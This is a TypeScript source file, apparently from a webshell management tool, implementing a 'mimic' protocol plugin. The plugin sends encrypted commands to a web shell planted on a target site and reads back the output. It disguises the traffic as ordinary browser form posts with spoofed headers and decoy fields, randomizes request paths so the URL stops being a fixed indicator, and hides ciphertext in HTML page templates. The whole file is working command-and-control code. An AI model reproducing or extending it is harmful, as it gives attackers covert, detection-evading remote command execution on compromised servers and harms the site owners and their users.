/**
 * mimic — the demo plugin: a shell protocol that shapes its traffic after
 * the target site's own pages (see docs/custom-memshell-design.md §B).
 *
 * Client side of the wire format documented in mimic-shared.ts:
 *   - requests look like an ordinary browser form POST;
 *   - responses are full HTML pages (the site profile's template) with the
 *     ciphertext hidden in a per-shell-unique JS variable assignment;
 *   - with --dynamic-path the request path is randomized using the path
 *     vocabulary the profile learned from the site (filter-style shells
 *     answer on any path, so the URL stops being a fixed indicator).
 *
 * The server side for local validation lives in mimic-server.ts; generating
 * a real Java memory shell from a profile is the P1 follow-up.
 */
import { randomInt } from "node:crypto";

import {
  inferBodyTemplateContentType,
  loadProfile,
  pickRequestShape,
  profileRequests,
  profileTemplates,
  type SiteProfile,
} from "../core/site-profile.js";
import { postRaw } from "./http.js";
import { randomString } from "./crypto.js";
import {
  deriveMarkers,
  resolveCipher,
  type MimicCipher,
  type ResponseMarkers,
} from "./mimic-codecs.js";
import {
  buildFormBody,
  buildJsonBody,
  deriveAesKey,
  encryptField,
  extractBetween,
  renderBodyTemplate,
  templateDelimiters,
  decryptField,
  renderFieldValue,
} from "./mimic-shared.js";
import type { ProtocolRequest, ShellProtocol } from "./registry.js";
import type { ConnectTestResult, ExecResult } from "./types.js";
import { buildHeaders } from "./types.js";

/** A minimal, self-consistent browser header set (suo5's lesson: match the UA). */
const BROWSER_HEADERS: Record<string, string> = {
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
  "Content-Type": "application/x-www-form-urlencoded",
};

interface MimicContext {
  pass: string;
  aesKey: string;
  cipher: MimicCipher;
  markers: ResponseMarkers;
  profile?: SiteProfile;
  dynamicPath: boolean;
}

function buildContext(req: ProtocolRequest): MimicContext {
  const pass = req.conn.pass ?? "pass";
  const secretKey = req.conn.key ?? "key";
  let profile: SiteProfile | undefined;
  const profileName = req.options.profile ?? req.conn.profile;
  if (profileName) {
    profile = loadProfile(profileName); // throws a descriptive error when missing
  }
  const cipher = resolveCipher(profile?.cipher);
  return {
    pass,
    aesKey: deriveAesKey(secretKey),
    cipher,
    markers: deriveMarkers(pass, secretKey, cipher),
    profile,
    dynamicPath: req.options.dynamicPath ?? false,
  };
}

/** Where to send this request: the fixed shell URL, or a randomized path. */
export function pickRequestUrl(connUrl: string, ctx: MimicContext): string {
  if (!ctx.dynamicPath || !ctx.profile || ctx.profile.paths.length === 0) {
    return connUrl;
  }
  const origin = new URL(connUrl).origin;
  const dir = ctx.profile.paths[randomInt(ctx.profile.paths.length)]!;
  const slug = randomString(8).toLowerCase();
  return `${origin}${dir}${slug}`;
}

interface MimicRoundTrip {
  ok: boolean;
  output?: string;
  error?: string;
  requestUrl: string;
  status: number;
  durationMs: number;
}

async function roundTrip(
  req: ProtocolRequest,
  ctx: MimicContext,
  plaintext: string,
): Promise<MimicRoundTrip> {
  let requestUrl = pickRequestUrl(req.conn.url, ctx);
  // pick one request shape (profiles may carry an array): the ciphertext rides
  // in shape.secretField — in the form body (default), the URL query, or a header
  const shape = pickRequestShape(ctx.profile ? profileRequests(ctx.profile) : []);
  const secretField = shape?.secretField ?? ctx.pass;
  const secretIn = shape?.secretIn ?? "body";
  const bodyStyle = shape?.bodyStyle ?? "form";
  const cipher = encryptField(Buffer.from(plaintext, "utf8"), ctx.aesKey, ctx.cipher);
  const decoys = (shape?.fields ?? []).map((f) => ({
    name: f.name,
    value: renderFieldValue(f.value),
  }));

  let body: Buffer;
  const extraHeaders: Record<string, string> = {};
  if (secretIn === "query") {
    const qs = buildFormBody([...decoys, { name: secretField, value: cipher }]).toString();
    requestUrl += (requestUrl.includes("?") ? "&" : "?") + qs;
    body = Buffer.alloc(0);
  } else if (secretIn === "header") {
    // base64 is legal in header values as-is — no URL-encoding there
    extraHeaders[secretField] = cipher;
    body = bodyStyle === "json" ? buildJsonBody(decoys) : buildFormBody(decoys);
  } else if (shape?.bodyTemplate) {
    // a full body template (chat-API JSON / GraphQL / XML / multipart…):
    // the ciphertext goes where {{payload}} sits, decoys ride {{macros}}
    body = renderBodyTemplate(shape.bodyTemplate, cipher);
  } else {
    body =
      bodyStyle === "json"
        ? buildJsonBody([...decoys, { name: secretField, value: cipher }])
        : buildFormBody([...decoys, { name: secretField, value: cipher }]);
  }
  const baseHeaders: Record<string, string> = { ...BROWSER_HEADERS };
  // query mode: an empty body must not claim a form Content-Type
  if (secretIn === "query") delete baseHeaders["Content-Type"];
  else if (shape?.bodyTemplate) {
    // explicit headers win (merged below); otherwise infer from the body —
    // a multipart template's boundary comes from its first delimiter line
    const t = shape.bodyTemplate.trimStart();
    if (t.startsWith("--")) {
      const boundary = t.split(/\r?\n/, 1)[0]!.slice(2);
      baseHeaders["Content-Type"] = `multipart/form-data; boundary=${boundary}`;
    } else {
      // shared with the custom build's body-read allowlist derivation
      const inferred = inferBodyTemplateContentType(shape.bodyTemplate);
      if (inferred) baseHeaders["Content-Type"] = inferred;
      else delete baseHeaders["Content-Type"];
    }
  } else if (bodyStyle === "json") baseHeaders["Content-Type"] = "application/json";
  const headers = buildHeaders(
    { ...baseHeaders, ...extraHeaders, ...(shape?.headers ?? {}) },
    req.common,
  );
  let res;
  try {
    res = await postRaw(requestUrl, body, {
      headers,
      timeoutMs: req.common.timeoutMs,
      insecure: req.common.insecure,
    });
  } catch (err) {
    return {
      ok: false,
      error: err instanceof Error ? err.message : String(err),
      requestUrl,
      status: 0,
      durationMs: 0,
    };
  }
  if (res.status !== 200) {
    return {
      ok: false,
      error: `HTTP ${res.status} — the endpoint did not answer like a mimic shell`,
      requestUrl,
      status: res.status,
      durationMs: res.durationMs,
    };
  }
  const text = res.body.toString("utf8");
  // try each cover template's delimiters — the server rotates templates, and
  // {{payload}} templates have their own exact bounds (any content type)
  const delimiters = templateDelimiters(
    ctx.profile ? profileTemplates(ctx.profile) : [],
    ctx.markers,
  );
  let b64: string | null = null;
  for (const d of delimiters) {
    b64 = extractBetween(text, d.left, d.right);
    if (b64 !== null) break;
  }
  if (b64 === null) {
    return {
      ok: false,
      error: "response marker not found — wrong pass/key, or the page is not a mimic shell",
      requestUrl,
      status: res.status,
      durationMs: res.durationMs,
    };
  }
  try {
    const output = decryptField(b64, ctx.aesKey, ctx.cipher).toString("utf8");
    return { ok: true, output, requestUrl, status: res.status, durationMs: res.durationMs };
  } catch {
    return {
      ok: false,
      error: "response decryption failed — wrong key?",
      requestUrl,
      status: res.status,
      durationMs: res.durationMs,
    };
  }
}

export const mimicProtocol: ShellProtocol = {
  name: "mimic",
  description: "site-mimicking demo protocol (profile-driven HTML skin + dynamic paths)",

  async test(req: ProtocolRequest): Promise<ConnectTestResult> {
    const started = Date.now();
    const tool = "mimic";
    const url = req.conn.url;
    let ctx: MimicContext;
    try {
      ctx = buildContext(req);
    } catch (err) {
      return {
        ok: false,
        tool,
        url,
        error: err instanceof Error ? err.message : String(err),
        durationMs: Date.now() - started,
      };
    }
    const canary = randomString(12);
    const r = await roundTrip(req, ctx, `echo ${canary}`);
    if (!r.ok) {
      return { ok: false, tool, url, error: r.error, durationMs: Date.now() - started };
    }
    if (!r.output!.includes(canary)) {
      return {
        ok: false,
        tool,
        url,
        error: "round-trip mismatch — endpoint decrypted but did not execute the canary",
        durationMs: Date.now() - started,
      };
    }
    const profileNote = ctx.profile ? `profile=${ctx.profile.name}` : "no profile";
    const pathNote = r.requestUrl === url ? "fixed path" : `dynamic path ${r.requestUrl}`;
    return {
      ok: true,
      tool,
      url,
      detail: `round-trip ok (${profileNote}; ${pathNote})`,
      durationMs: Date.now() - started,
    };
  },

  async exec(req: ProtocolRequest, command: string): Promise<ExecResult> {
    const started = Date.now();
    const tool = "mimic";
    const url = req.conn.url;
    let ctx: MimicContext;
    try {
      ctx = buildContext(req);
    } catch (err) {
      return {
        ok: false,
        tool,
        url,
        command,
        error: err instanceof Error ? err.message : String(err),
        durationMs: Date.now() - started,
      };
    }
    const r = await roundTrip(req, ctx, command);
    if (!r.ok) {
      return { ok: false, tool, url, command, error: r.error, durationMs: Date.now() - started };
    }
    return { ok: true, tool, url, command, output: r.output, durationMs: Date.now() - started };
  },
};
